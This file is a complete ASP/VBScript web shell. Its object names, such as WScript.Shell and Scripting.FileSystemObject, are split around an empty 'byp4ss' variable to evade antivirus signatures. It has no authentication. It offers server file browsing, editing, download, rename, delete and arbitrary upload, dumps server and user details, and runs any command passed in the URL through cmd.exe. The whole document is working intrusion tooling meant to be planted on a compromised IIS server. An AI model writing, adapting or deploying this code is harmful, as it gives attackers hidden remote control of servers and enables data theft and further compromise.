<%
On Error Resume Next
Set fileso = CreateObject("Script"&byp4ss&"ing.File"&byp4ss&"SystemObject")
dim head,endd,pathn,enddd
 FolderPath = Request.ServerVariables("PAT"&byp4ss&"H_TRANS"&byp4ss&"LATED")
Private Function ParseFolder(PathString)
 Dim liCount
 If Right(PathString, 1) = "\" Then
  ParseFolder = PathString
 Else
  For liCount = Len(PathString) To 1 Step -1
   If Mid(PathString, liCount, 1) = "\" Then
    ParseFolder = Left(PathString, liCount)
    Exit For
   End If
  Next
 End If
End Function
Function getsize(size)
If size>=(1024 * 1024 * 1024)Then getsize=Fix((size /(1024 * 1024 * 1024))* 100)/ 100&"G"
If size>=(1024 * 1024)And size<(1024 * 1024 * 1024)Then getsize=Fix((size /(1024 * 1024))* 100)/ 100&"M"
If size>=1024 And size<(1024 * 1024)Then getsize=Fix((size / 1024)* 100)/ 100&"K"
If size>=0 And size<1024 Then getsize=size&"B"
End Function
Set wssh = Server.CreateObject("W"&byp4ss&"Scr"&byp4ss&"ipt.Sh"&byp4ss&"ell")
Set envinfo = wssh.Environment("SY"&byp4ss&"STEM")
Set wsshn = Server.CreateObject("W"&byp4ss&"Sc"&byp4ss&"ript.Ne"&byp4ss&"twork")
Class FileUploader
'Class Upload File Microsoft
	Public  Files
	Private mcolFormElem
	Private Sub Class_Initialize()
		Set Files = Server.CreateObject("Script"&byp4ss&"ing"&byp4ss&".Dicti"&byp4ss&"onary")
		Set mcolFormElem = Server.CreateObject("Scripti"&byp4ss&"ng.Dic"&byp4ss&"tionary")
	End Sub
	Private Sub Class_Terminate()
		If IsObject(Files) Then
			Files.RemoveAll()
			Set Files = Nothing
		End If
		If IsObject(mcolFormElem) Then
			mcolFormElem.RemoveAll()
			Set mcolFormElem = Nothing
		End If
	End Sub
	Public Property Get Form(sIndex)
		Form = ""
		If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))
	End Property
	Public Default Sub Upload()
		Dim biData, sInputName
		Dim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos
		Dim nPosFile, nPosBound
		biData = Request.BinaryRead(Request.TotalBytes)
		nPosBegin = 1
		nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
		If (nPosEnd-nPosBegin) <= 0 Then Exit Sub
		vDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
		nDataBoundPos = InstrB(1, biData, vDataBounds)
		Do Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString("--"))
			nPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))
			nPos = InstrB(nPos, biData, CByteString("name="))
			nPosBegin = nPos + 6
			nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))
			sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			nPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))
			nPosBound = InstrB(nPosEnd, biData, vDataBounds)
			If nPosFile <> 0 And  nPosFile < nPosBound Then
				Dim oUploadFile, sFileName
				Set oUploadFile = New UploadedFile
				nPosBegin = nPosFile + 10
				nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))
				sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, "\"))
				nPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))
				nPosBegin = nPos + 14
				nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
				oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				nPosBegin = nPosEnd+4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
				If oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile
			Else
				nPos = InstrB(nPos, biData, CByteString(Chr(13)))
				nPosBegin = nPos + 4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				If Not mcolFormElem.Exists(LCase(sInputName)) Then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			End If
			nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)
		Loop
	End Sub
	Private Function CByteString(sString)
		Dim nIndex
		For nIndex = 1 to Len(sString)
		   CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))
		Next
	End Function
	Private Function CWideString(bsString)
		Dim nIndex
		CWideString =""
		For nIndex = 1 to LenB(bsString)
		   CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1))) 
		Next
	End Function
End Class
Class UploadedFile
	Public ContentType
	Public FileName
	Public FileData
	Public Property Get FileSize()
		FileSize = LenB(FileData)
	End Property
	Public Sub SaveToDisk(sPath)
		Dim oFS, oFile
		Dim nIndex
		If sPath = "" Or FileName = "" Then Exit Sub
		If Mid(sPath, Len(sPath)) <> "\" Then sPath = sPath & "\"
		Set oFS = Server.CreateObject("Scrip"&byp4ss&"ting.FileSy"&byp4ss&"stemObj"&byp4ss&"ect")
		If Not oFS.FolderExists(sPath) Then Exit Sub
		Set oFile = oFS.CreateTextFile(sPath & FileName, True)
		For nIndex = 1 to LenB(FileData)
		    oFile.Write Chr(AscB(MidB(FileData,nIndex,1)))
		Next
		oFile.Close
	End Sub
End Class
if request.querystring("uploadnow")<>"" then
Set Uploader = New FileUploader
	Uploader.Upload()
	If Uploader.Files.Count = 0 Then
		Response.Write "<script>alert('File Not Uploaded')</script>"
	Else
		Response.Write "<script>alert('File Uploaded Successfully')</script>"
		For Each File In Uploader.Files.Items
			File.SaveToDisk Request.querystring("address")
		Next
	End If
End If
pathn=Request.QueryString("address")
if pathn ="" Then
	pathn=ParseFolder(FolderPath)
Else
	pathn=Request.QueryString("address")
end if
enddd="<p align='center'>&nbsp;</td></tr></tbody></table></div></td></tr><tr><td bgcolor='#c6c6c6'><p style='margin-top: 0pt; margin-bottom: 0pt' align='center'><span lang='en-us'><font face='Tahoma' style='font-size: 9pt'></font></span></td></tr></tbody></table></div></body></html>"
If pathn <>"" and CInt(Len(pathn) - 1) <> 2 Then
	barrapos = CInt(InstrRev(Left(pathn,Len(pathn) - 1),"\")) - 1
	backlevel = Left(pathn,barrapos)
	backk="<br><a href=""?do=back&address="& backlevel &"\"&"""><font color=black><b>Back</b></font>"
End If
if request.querystring("dltype")= "file" then
	fileadd=request.querystring("address") & request.querystring("filename")
	Response.Buffer = True
	Response.Clear
	Set dlfile = fileso.GetFile(fileadd)
	Response.AddHeader "Content-Disposition", "attachment; filename=" & request.querystring("filename")
	Response.AddHeader "Content-Length", dlfile.size
	Response.Charset = "UTF-8"
	Response.ContentType = "application/download"
	Set Stream = Server.CreateObject("ADODB.Stream")
	Stream.Open
	Stream.type = 1
	Stream.LoadFromFile dlfile
	Response.BinaryWrite Stream.Read
	Response.Flush
	Stream.Close
	Set Stream = Nothing
end if
if request.querystring("do")= "delete" and request.querystring("type")= "file" then
	fileadd=request.querystring("address") & request.querystring("filename")
	Set filetodel = fileso.GetFile(fileadd)
	filetodel.delete
If Err.Number <> 0 Then
	Response.Write "<script>alert('"&Err.Description&"')</script>"
else
	Response.Write "<script>alert('File Deleted Successfully')</script>"
End If	
	fileadd=""
end if
if request.querystring("do")= "dl" and request.querystring("type")= "file" then
	fileadd=request.querystring("address") & request.querystring("filename")
	Set filetodel = fileso.GetFile(fileadd)
	filetodel.delete 
	fileadd=""
end if
Set patha = fileso.GetFolder(pathn&"\")
Set dirs = patha.SubFolders
Set files = patha.Files
for each filead in files
	file=file&"<table cellpadding='0' cellspacing='0' style='border-style: dotted; border-width: 0px' bordercolor='#CDCDCD' width='950' height='20' dir='ltr'><tr onmouseover='this.className=""focus"";' onmouseout='this.className="""";'><td valign='top' height='19' width='842'><p align='left'><span lang='en-us'><font face='Tahoma' style='font-size: 9pt'><a href='?do=edit&address="& pathn &"&filename="& filead.name &"'>"& filead.Name &"</span></td><td valign='top' height='19' width='110'><font face='Tahoma' style='font-size: 9pt'>" & getsize(filead.size) & "</td><td valign='top' height='19' width='220'><font face='Tahoma' style='font-size: 9pt'>"& filead.DateLastModified &"</td><td valign='top' height='19' width='30'><font face='Tahoma' style='font-size: 9pt'></td><td valign='top' height='19' width='30'><font face='Tahoma' style='font-size: 9pt'><a href='?do=edit&address="& pathn &"\&filename="& filead.name &"'>Edit</a></td><td valign='top' height='19' width='22'><font face='Tahoma' style='font-size: 9pt'><a href='?dltype=file&address="& pathn &"\&filename="& filead.name &"'>DL</a></td><td valign='top' height='19' width='30'><font face='Tahoma' style='font-size: 9pt'><a href='?do=rename&address="& pathn &"&filename="& filead.name &"'>Ren</a></td><td valign='top' height='19' width='30'><font face='Tahoma' style='font-size: 9pt'><a href='?do=delete&type=file&address="& pathn &"&filename="& filead.name &"'>Del</a></td></tr></table>"
next
for each dirl in dirs
	dirlist=dirlist&"<table cellpadding='0' cellspacing='0' style='border-style: dotted; border-width: 0px' bordercolor='#CDCDCD' width='950' height='20' dir='ltr'><tr onmouseover='this.className=""focus"";' onmouseout='this.className="""";'><td valign='top' height='19' width='842'><p align='left'><span lang='en-us'><font face='Tahoma' style='font-size: 9pt'><a href='?do=goto&address="& dirl &"\'><b>"&dirl.name&"</b></span></td><td valign='top' height='19' width='220'><font face='Tahoma' style='font-size: 9pt'>"& dirl.DateLastModified  &"</td><td valign='top' height='19' width='30'><font face='Tahoma' style='font-size: 9pt'></td><td valign='top' height='19' width='30'><font face='Tahoma' style='font-size: 9pt'></td></td><td valign='top' height='19' width='30'><font face='Tahoma' style='font-size: 9pt'></td><td valign='top' height='19' width='30'><font face='Tahoma' style='font-size: 9pt'><a href='?do=delete&type=dir&address='.$cwd.$slash.'&filename='.$fileee.''>Del</a></td></tr></table>"
next
head="<body  topmargin='0' leftmargin='0' rightmargin='0' bgcolor='#f2f2f2'><div align='center'>&nbsp;<table border='1' width='1000' height='14' bordercolor='#CDCDCD' style='border-collapse: collapse; border-style: solid; border-width: 1px'><tr><td height='14' width='996'><p align='center'><font face='Tahoma' style='font-size: 9pt'><span lang='en-us'><a href='?do=home'>Home</a> -- <a href='?do=filemanger&address=" & pathn & "'>File Manger</a> -- <a href='?do=cmd&address=" & pathn & "'>Command Execute</a> -- <a href='?do=info&address=" & pathn & "'>Server Information</a> -- <a href='?do=about&address=" & pathn & "'>About</a></span></font></td></tr></table></div><div align='center'><table id='table2' style='border-collapse: collapse; border-style: solid;' width='1000' bgcolor='#eaeaea' border='1' bordercolor='#c6c6c6' cellpadding='0'><tbody><tr><td><div align='center'><table id='table3' style='border-style:dashed; border-width:1px; margin-top: 20px; margin-bottom: 20px; border-collapse: collapse' width='950' border='1' bordercolor='#cdcdcd' height='620' bordercolorlight='#CDCDCD' bordercolordark='#CDCDCD'><tbody><tr><td style='border: 1px solid rgb(198, 198, 198);' width='950' bgcolor='#e7e3de' height='590' valign='top'>"
if request.querystring("uploadnow")= "" then
if request.form("source")<> "" then
	fileadd=request.form("address") & request.form("filename")
	nextline = Request.Form("source")
	nextline = Split(nextline,vbCrLf)
	Set filetosave = fileso.OpenTextFile(fileadd,2)
	For i = 0 To UBound(nextline)
	filetosave.WriteLine(nextline(i))
	Next
	filetosave.Close
If Err.Number <> 0 Then
	Response.Write "<script>alert('"&Err.Description&"')</script>"
else
	Response.Write "<script>alert('File Saved Successfully')</script>"
End If	
	Set filetosave = Nothing
	fileadd=""
end if
Function getdrive()
	Set drivelist=fileso.drives
	For Each tmpdrive IN drivelist
		if tmpdrive.DriveType=2 then
			tmpgd=tmpgd & "<a href='" & Request.ServerVariables("SCRIPT_NAME") & "?address=" & tmpdrive.driveletter&":\" & "'>" & UCase(tmpdrive.driveletter) & ":" & "</a> "
		end if
	next		
	getdrive=tmpgd	
end function
if request.form("renameto")<> "" then
	fileadd=request.form("address") & request.form("filename")
	Set filetoren = fileso.GetFile(fileadd)
	filetoren.Move (request.form("renameto"))
	If Err.Number <> 0 Then
		Response.Write "<script>alert('"&Err.Description&"')</script>"
	else
		Response.Write "<script>alert('File Rename Successfully')</script>"
	End If	
	fileadd=""
end if
end if
response.write("<style type='text/css'>A:link {text-decoration: none}A:visited {text-decoration: none}A:active {text-decoration: none}A:hover {text-decoration: underline overline; color: 414141;}.focus td{border-top:0px solid #f8f8f8;border-bottom:1px solid #ddd;background:#f2f2f2;padding:0px 0px 0px 0px;}</style><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>")
if request.querystring("do")="edit" then
	addressfile=Request.QueryString("address") & Request.QueryString("filename")
	Set filesource = fileso.OpenTextFile(addressfile)
	response.write(head&"<form action="""&Request.ServerVariables("SCRIPT_NAME")&"?address="& Request.QueryString("address")&"""method=post><p align='center'>"& Request.QueryString("address")&Request.QueryString("filename")&"<br><textarea name=source cols=80 rows=25>"& Server.HTMLEncode(filesource.ReadAll) &"</textarea><br><input type=hidden name=address value='"&Request.QueryString("address")&"'><input type=hidden name=filename value='"&Request.QueryString("filename")&"'><input type=submit value='   Save   '></form>")
elseif(request.querystring("do")="rename") then
	response.write(head&"<form action="""&Request.ServerVariables("SCRIPT_NAME")&"?address="& Request.QueryString("address")&"""method=post><p align='center'>"&Request.QueryString("filename")&" Rename To : <input name=renameto><input type=hidden name=address value='"&Request.QueryString("address")&"'><input type=hidden name=filename value='"&Request.QueryString("filename")&"'><input type=submit value='   Rename   '></form>")
elseif(request.querystring("do")="info") then
	response.write(head&" OS : "& envinfo("OS") &"<br>"&" Username : "& wsshn.username &"<br>"&" Web Serever : "&Request.ServerVariables("SERVER_SOFTWARE")&"<br>"&" Serever Name : "&Request.ServerVariables("SERVER_NAME")&"<br>"&" Serever Port : "&Request.ServerVariables("SERVER_PORT")&"<br>"&" Server ip : "&Request.ServerVariables("LOCAL_ADDR")&"<br>"&" Your ip : "&Request.ServerVariables("REMOTE_ADDR")&"<br>"&" App Path : "&Request.ServerVariables("APPL_PHYSICAL_PATH")&"<br>"&" Win Path : "&wssh.ExpandEnvironmentStrings("%SYSTEMROOT%")&"<br>")
elseif(request.querystring("do")="cmd") then
	if request.querystring("command") <>"" then
		cmtmp = "c:\" & fileso.GetTempName() 
		Call wssh.Run ("cmd.exe /c " & request.querystring("command") & " > " & cmtmp, 0, True) 
		Set readcmtmp = fileso.OpenTextFile (cmtmp, 1, False, 0)
		rescmd= Replace(Replace(Server.HTMLEncode(readcmtmp.ReadAll),VbCrLf,"<br>")," ","&nbsp;")
		readcmtmp.Close 
		Call fileso.DeleteFile(cmtmp, True) 
		If Err.Number <> 0 Then
			rescmd=Err.Description
		end if
	end if
	response.write(head&"<form action="""&Request.ServerVariables("SCRIPT_NAME")&"""method=get><p align='center'>"&"<br><input type=hidden name=address value='"&request.querystring("address")&"'><input type=hidden name=do value=cmd>Command : <input size=50 name=command value='"&request.querystring("command")&"'><br><textarea cols=80 rows=18>"&rescmd&"</textarea><br><input type=submit value=eXecute></form>")
elseif(request.querystring("do")="about") then
	response.write(head&"")
else
	response.write(head & "<font face='Tahoma' style='font-size: 6pt'><table cellpadding='0' cellspacing='0' style='border-style: dotted; border-width: 1px' bordercolor='#CDCDCD' width='950' height='20' dir='ltr'><tr onmouseover='this.className=""focus"";' onmouseout='this.className="""";'><td valign='top' height='19' width='842'><p align='left'><span lang='en-us'><font face='Tahoma' style='font-size: 9pt'><font color=#4a7af4>Now Directory : "&pathn&"<br> "&getdrive()&"<font color=#000000>"&backk&"</span></td></table>"& dirlist &file&"<hr><center><form method='get' action='"&Request.ServerVariables("SCRIPT_NAME")&"'><font size=2>Change Dir : <input size=50 name='address' value='"&pathn&"'><input type=submit value='Change'></form><form method='get' action='"&Request.ServerVariables("SCRIPT_NAME")&"'><font size=2><input type=hidden name=do value=cmd><input type=hidden name=address value='"&pathn&"'>Command : <input size=50 name=command><input type=submit value='eXecute'></form><form method=post enctype=multipart/form-data action='"&Request.ServerVariables("SCRIPT_NAME")&"?uploadnow=upload&address="&pathn&"'><font size=2>Upload File : <input type=file size=50 name='file1'><br><input type=submit value=Send></form></tr></table>"&enddd)
end if

%>